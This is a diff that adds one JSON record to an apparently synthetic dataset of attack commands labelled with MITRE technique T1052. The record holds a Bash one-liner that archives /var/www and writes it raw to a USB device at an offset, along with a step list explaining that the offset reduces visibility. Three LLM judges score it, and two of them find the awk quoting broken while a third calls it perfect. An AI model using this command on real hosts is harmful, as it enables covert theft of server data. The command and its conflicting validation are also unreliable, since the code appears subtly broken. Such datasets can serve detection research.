@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'UDEV=$(lsblk -o NAME,TRAN -nr | awk \"$2==\\\"usb\\\"{print \\\"/dev/\\\"$1}\" | head -n1); tar -cf - /var/www | gzip -9 | dd of=\"$UDEV\" bs=1M seek=8 conv=notrunc,fsync status=none'",
+  "explanation": "Writes a gzip-compressed tar of /var/www directly to the USB device starting at an offset (seek=8), embedding data on physical media without mounting a filesystem.",
+  "rationale_steps": [
+    "Find the raw USB device node with lsblk.",
+    "Create a compressed tar archive of local web content.",
+    "Write to the USB at a non-zero offset to reduce visibility.",
+    "Keep all operations local to the host and physical device."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-57097ab4",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, proper separators, and valid options for lsblk, tar, gzip, and dd.",
+        "semantic_score": 3,
+        "semantic_justification": "While the approach aligns with exfiltration to a raw USB device at an offset, the awk program is double-quoted so $1/$2 are expanded by the shell, likely leaving UDEV empty and causing dd to fail, undermining the intended operation.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:19:04.049743Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct escape sequences for the awk command within the bash script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by automatically detecting a USB device, compressing sensitive web content (/var/www), and writing it directly to the physical medium at a specific offset that could evade detection by not using standard file operations.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T09:19:07.101654Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 2,
+        "syntactic_justification": "The awk script within the bash -c string contains unescaped shell variables ($1, $2) that bash will expand prematurely, making the awk command syntactically invalid and causing the UDEV assignment to fail.",
+        "semantic_score": 4,
+        "semantic_justification": "The command's design effectively uses lsblk, tar, gzip, and dd with an offset to exfiltrate compressed data to a raw USB device, demonstrating a sophisticated and operationally plausible method for T1052, despite the syntax error preventing execution as-is.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T09:19:37.875220Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
